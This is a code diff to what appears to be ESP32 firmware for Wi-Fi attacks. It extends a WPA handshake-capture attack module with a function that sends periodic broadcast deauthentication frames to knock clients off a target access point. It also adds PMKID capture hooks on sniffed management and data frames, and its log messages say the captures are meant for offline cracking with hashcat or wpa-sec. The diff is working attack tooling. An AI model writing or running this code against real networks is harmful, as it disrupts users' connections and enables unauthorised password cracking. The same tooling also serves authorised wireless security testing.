@@ -28,6 +28,7 @@
 #include "pcap_serializer.h"
 #include "hccapx_serializer.h"
 #include "sniffer.h"
+#include "pmkid_capture.h"
 
 #include <stdio.h>
 #include <time.h>
@@ -136,6 +137,29 @@ static void deauth_timer_callback(void *arg) {
     send_deauth_frame();
 }
 
+esp_err_t attack_handshake_enable_broadcast_deauth(void)
+{
+    if (!attack_running) return ESP_ERR_INVALID_STATE;
+    if (method == ATTACK_HANDSHAKE_METHOD_BROADCAST) return ESP_OK;
+    send_deauth_frame();
+    const esp_timer_create_args_t args = {
+        .callback = &deauth_timer_callback,
+        .arg = NULL,
+        .name = "deauth_timer",
+    };
+    esp_err_t err = esp_timer_create(&args, &deauth_timer_handle);
+    if (err == ESP_OK) err = esp_timer_start_periodic(deauth_timer_handle, 1000000);
+    if (err != ESP_OK) {
+        if (deauth_timer_handle) {
+            esp_timer_delete(deauth_timer_handle);
+            deauth_timer_handle = NULL;
+        }
+        return err;
+    }
+    method = ATTACK_HANDSHAKE_METHOD_BROADCAST;
+    return ESP_OK;
+}
+
 /**
  * @brief Callback for DATA_FRAME_EVENT_EAPOLKEY_FRAME event.
  * 
@@ -229,11 +253,14 @@ static uint8_t get_eapol_message_number(data_frame_t *frame) {
  * Captures beacon frame from target AP to include ESSID in PCAP
  */
 static void mgmt_frame_handler(void *args, esp_event_base_t event_base, int32_t event_id, void *event_data) {
+    wifi_promiscuous_pkt_t *frame = (wifi_promiscuous_pkt_t *) event_data;
+    pmkid_capture_observe(frame->payload, frame->rx_ctrl.sig_len,
+                          frame->rx_ctrl.timestamp, current_ap_record.bssid,
+                          (const char *)current_ap_record.ssid);
+    if (frame->rx_ctrl.sig_len < 24) return;
     if (captured_beacon) {
         return; // Already have beacon
     }
-    
-    wifi_promiscuous_pkt_t *frame = (wifi_promiscuous_pkt_t *) event_data;
     
     // Check if this is a beacon (subtype 0x80) or probe response (0x50)
     uint8_t frame_type = frame->payload[0];
@@ -252,6 +279,20 @@ static void mgmt_frame_handler(void *args, esp_event_base_t event_base, int32_t 
     
     ESP_LOGI(TAG, "✓ BEACON frame captured and saved (ESSID: %s)", current_ap_record.ssid);
     ESP_LOGI(TAG, "  This frame is needed for PMK calculation in hashcat/wpa-sec");
+}
+
+/* Observe original DATA events before the handshake analyzer's message and
+ * BSSID filters. The bounded parser resolves AP/STA addresses from DS bits. */
+static void pmkid_data_frame_handler(void *args, esp_event_base_t event_base,
+                                     int32_t event_id, void *event_data)
+{
+    (void)args;
+    (void)event_base;
+    (void)event_id;
+    const wifi_promiscuous_pkt_t *frame = event_data;
+    pmkid_capture_observe(frame->payload, frame->rx_ctrl.sig_len,
+                          frame->rx_ctrl.timestamp, current_ap_record.bssid,
+                          (const char *)current_ap_record.ssid);
 }
 
 static void eapolkey_frame_handler(void *args, esp_event_base_t event_base, int32_t event_id, void *event_data) {
@@ -426,6 +467,7 @@ esp_err_t attack_handshake_start(const wifi_ap_record_t *ap_record, attack_hands
     // Register handlers for both EAPOL and MGMT frames
     ESP_ERROR_CHECK(esp_event_handler_register(FRAME_ANALYZER_EVENTS, DATA_FRAME_EVENT_EAPOLKEY_FRAME, &eapolkey_frame_handler, NULL));
     ESP_ERROR_CHECK(esp_event_handler_register(SNIFFER_EVENTS, SNIFFER_EVENT_CAPTURED_MGMT, &mgmt_frame_handler, NULL));
+    ESP_ERROR_CHECK(esp_event_handler_register(SNIFFER_EVENTS, SNIFFER_EVENT_CAPTURED_DATA, &pmkid_data_frame_handler, NULL));
     
     attack_running = true;
     
@@ -499,6 +541,9 @@ void attack_handshake_stop(){
     
     // Stop frame analyzer
     frame_analyzer_capture_stop();
+
+    esp_event_handler_unregister(SNIFFER_EVENTS, SNIFFER_EVENT_CAPTURED_DATA,
+                                 &pmkid_data_frame_handler);
     
     // Unregister event handlers (ignore ESP_ERR_NOT_FOUND if already unregistered)
     esp_err_t err;
